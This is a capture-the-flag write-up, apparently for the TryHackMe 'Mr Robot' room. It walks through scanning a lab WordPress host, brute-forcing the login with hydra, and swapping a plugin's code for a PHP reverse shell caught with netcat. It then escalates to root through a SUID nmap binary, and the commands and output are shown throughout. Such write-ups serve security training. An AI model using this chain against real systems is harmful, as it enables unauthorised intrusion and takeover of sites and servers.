<p align="center">
  THM : Mr Robot CTF<br>
  Difficulty : Medium<br>
  <img src="https://i.imgur.com/FSFrrmV.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Website enumeration](#website-enumeration)
- [Remove duplicates in the wordlist](#remove-duplicates-in-the-wordlist)
- [Bruteforce wordpress usernames](#bruteforce-wordpress-usernames)
- [Bruteforce wordpress password](#bruteforce-wordpress-password)
- [Get a reverse shell](#get-a-reverse-shell)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

First, let's use [nmap](https://nmap.org/) to find out what ports are open on the target :  
```
attacker@AttackBox:~/Mr_Robot_CTF$ nmap 10.10.241.169 -A -p- -oN nmapResults.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-10 14:37 CET
Nmap scan report for 10.10.241.169
Host is up (0.031s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.00 seconds
```

There is only port 80 and port 443 open. So we have to enumerate the website on port 80 or 443.

## Website enumeration

First, we can use [Gobuster](https://github.com/OJ/gobuster) to find pages and directories on port 80 :  
```
attacker@AttackBox:~/Mr_Robot_CTF$ gobuster dir -u http://10.10.241.169/ -w /opt/dirbuster/directory-list-2.3-medium.txt -o gobusterResults.txt
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.241.169/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2023/01/10 14:44:24 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 236] [--> http://10.10.241.169/images/]
/blog                 (Status: 301) [Size: 234] [--> http://10.10.241.169/blog/]
/sitemap              (Status: 200) [Size: 0]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.241.169/feed/]
/login                (Status: 302) [Size: 0] [--> http://10.10.241.169/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.241.169/0/]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.241.169/feed/]
/video                (Status: 301) [Size: 235] [--> http://10.10.241.169/video/]
/image                (Status: 301) [Size: 0] [--> http://10.10.241.169/image/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.241.169/feed/atom/]
/wp-content           (Status: 301) [Size: 240] [--> http://10.10.241.169/wp-content/]
/admin                (Status: 301) [Size: 235] [--> http://10.10.241.169/admin/]
/audio                (Status: 301) [Size: 235] [--> http://10.10.241.169/audio/]
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2613]
/css                  (Status: 301) [Size: 233] [--> http://10.10.241.169/css/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.241.169/feed/]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 241] [--> http://10.10.241.169/wp-includes/]
/js                   (Status: 301) [Size: 232] [--> http://10.10.241.169/js/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.241.169/Image/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.241.169/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://10.10.241.169/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
...
```

We can see there are directories named `wp-login`, `wp-content` and `wp-includes`. So the website is running wordpress.  
There is also a directory named `robots` Maybe it's the same thing as `robots.txt`. Let's take a look at it :  
![](https://i.imgur.com/kwF6lr8.jpg)  

There are two files listed here : 
- key-1-of-3.txt <- The first flag
- fsocity.dic <- Maybe a wordlist ?

First, let's get the first flag at `/key-1-of-3.txt`:  
![](https://i.imgur.com/iJCTVvU.jpg)  

Now, let's take a look at `/fsocity.dic` :  
![](https://i.imgur.com/D8F3PeG.jpg)  

The file has been downloaded. Let's see what's inside :  
```
attacker@AttackBox:~/Mr_Robot_CTF$ cat fsocity.dic
...
...
34459952156456d29bc5b0
hassle
among
resource
2Fgeneraln
Forums
mail
attachments
ER28-0652
psychedelic
iamalearn
uHack
imhack
abcdefghijklmno
abcdEfghijklmnop
abcdefghijklmnopq
c3fcd3d76192e4007dfb496cca67e13b
ABCDEFGHIJKLMNOPQRSTUVWXYZ
attacker@AttackBox:~/Mr_Robot_CTF$
```

It's a huge file ! Let's take a look at its size :  
```
attacker@AttackBox:~/Mr_Robot_CTF$ ls -lah fsocity.dic 
-rw-r--r-- 1 attacker attacker 7,0M 10 janv. 16:20 fsocity.dic
```

## Remove duplicates in the wordlist

This wordlist is way too large to be used in a brute force attack... But if we take a look at the file more carefuly, we can see there is a huge amount of duplicates. 
For example, you can find the line `this` in the wordlist, let's see how many duplicates are in the file for the line `this` :  
```
attacker@AttackBox:~/Mr_Robot_CTF$ cat fsocity.dic | grep this
this
20this
this
20this
this
20this
this
20this
this
20this
this
20this
this
20this
this
20this
this
20this
this
20this
this
20this
...
```

So now, we know why the wordlist is so large. I wrote a simple python script to remove all the duplicates. Here is it :  
```
#!/usr/bin/python3

known_words = []

print("Reading words from fsocity.dic...")

with open("fsocity.dic", "r") as file:
    for line in file:
        if line not in known_words:
            known_words.append(line)

print("Writing words in wordlist.txt...")

with open("wordlist.txt", "w") as file :
    for line in known_words:
        file.write(line)

print("Done !")
```

After we execute this script, we can notice a big difference between the new generated wordlist and the original file :  
```
attacker@AttackBox:~/Mr_Robot_CTF$ ls -lah fsocity.dic wordlist.txt 
-rw-r--r-- 1 attacker attacker 7,0M 10 janv. 16:20 fsocity.dic
-rw-r--r-- 1 attacker attacker  95K 10 janv. 16:30 wordlist.txt
```

## Bruteforce wordpress usernames

Now, we can use [hydra](https://github.com/vanhauser-thc/thc-hydra) with this new wordlist to find usernames for the wordpress admin panel ! 
First, let's capture the login request using [Burp Suite](https://portswigger.net/burp) :  
![](https://i.imgur.com/nHlg3Iy.jpg)  

We can also see the error message we get when using wrong username :  
![](https://i.imgur.com/q0HRkBQ.jpg)  

Now, we can use this two informations in [hydra](https://github.com/vanhauser-thc/thc-hydra) to bruteforce usernames :  
```
attacker@AttackBox:~/Mr_Robot_CTF$ hydra -L wordlist.txt -p test 10.10.241.169 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.241.169%2Fwp-admin%2F&testcookie=1:Invalid username"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-10 16:45:56
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:11452/p:1), ~716 tries per task
[DATA] attacking http-post-form://10.10.241.169:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.241.169%2Fwp-admin%2F&testcookie=1:Invalid username
[80][http-post-form] host: 10.10.241.169   login: Elliot   password: test
```

The password is just here for the test, it's not the right password. But now we have the username Elliot ! 

## Bruteforce wordpress password

We can use [hydra](https://github.com/vanhauser-thc/thc-hydra) again but this time to bruteforce Elliot's password (Remember to change the error message for hydra):  
(The bruteforce will take long to find the right password because it is at the end of the wordlist.. It took more than an hour for me...)
```
attacker@AttackBox:~/Mr_Robot_CTF$ hydra -l Elliot -P wordlist_crop.txt 10.10.241.169 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.241.169%2Fwp-admin%2F&testcookie=1:Incorrect"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-10 16:48:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:1/p:20), ~2 tries per task
[DATA] attacking http-post-form://10.10.241.169:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.241.169%2Fwp-admin%2F&testcookie=1:Incorrect
[80][http-post-form] host: 10.10.241.169   login: Elliot   password: ER28-0652
```

We now have the password for user Elliot ! Let's try to login on the wordpress admin panel with those credentials :  
![](https://i.imgur.com/H61mKaB.jpg)  

We are logged in !

## Get a reverse shell

After some reasearch, I found somewhere to put a php reverse shell. We can edit almost any plugin source code and replace it with a reverse shell. Let's go 
to the `Plugins` tab :  
![](https://i.imgur.com/379S5PU.jpg)  

Now, for example, we can click on the `Edit` button under the plugin `All in One SEO Pack` :  
![](https://i.imgur.com/x93QmcC.jpg)  

We can replace the source code with a php reverse shell from [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Don't 
forget to change the listening IP adress and port :  
![](https://i.imgur.com/Fv24mn0.jpg)  

Let's save it by clicking the `Update File` button. Then, we can note the file name shown at the right of the screen :  
![](https://i.imgur.com/qmBqrtz.jpg)  

Let's start a listener on our machine :  
```
attacker@AttackBox:~/Mr_Robot_CTF$ nc -lnvp 4242
listening on [any] 4242 ...
```

Then, we can navigate to `http://[IP]/wp-content/plugins/` + plugin file name. So for me it's http://10.10.241.169/wp-content/plugins/all-in-one-seo-pack/all_in_one_seo_pack.php. 
After this, we can take a look at our netcat listener and see if we have a shell :  
```
attacker@AttackBox:~/Mr_Robot_CTF$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.14.32.60] from (UNKNOWN) [10.10.241.169] 47572
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 15:59:49 up  2:26,  0 users,  load average: 0.00, 0.07, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$
```

We now have a reverse shell ! Let's stabilize it by using `python3 -c 'import pty; pty.spawn("/bin/bash")'`, then we press CTRL+Z to background the shell, and we type 
`stty -echo raw;fg`. To be able to use `clear`, we can type `export TERM=xterm`. Now we have a fully stabilized shell !

## Privilege escalation

Let's try to find SUID binaries :  
```
daemon@linux:/$ find / -type f -perm -4000 2>/dev/null 
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

Mh... Why nmap has the suid bit set ? Let's see on [GTFOBins](https://gtfobins.github.io/) if we can spawn a shell using nmap :  
![](https://i.imgur.com/2098KVp.jpg)  

And yes ! We can spawn a shell with nmap ! Let's do this :  
```
daemon@linux:/$ /usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# whoami
root
#
```

And we have a shell as root ! Let's get the two last flag. The second flag is in `/home/robot` :  
```
# cd /home/robot
# ls -la     
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
# cat key-2-of-3.txt
***************************
```

And the third flag is in `/root` :  
```
# cd /root
# ls -la
total 32
drwx------  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
-rw-------  1 root root 4058 Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  2 root root 4096 Nov 13  2015 .cache
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
# cat key-3-of-3.txt
****************************
```

## Conclusion

This room was very cool ! We practiced : 
- active reconnaissance using nmap
- website enumeration using gobuster
- brute force using hydra
- getting a reverse shell by editing php code of a plugin
- privilege escalation using suid binary

Thanks for this room ! And thanks for reading my write ups !



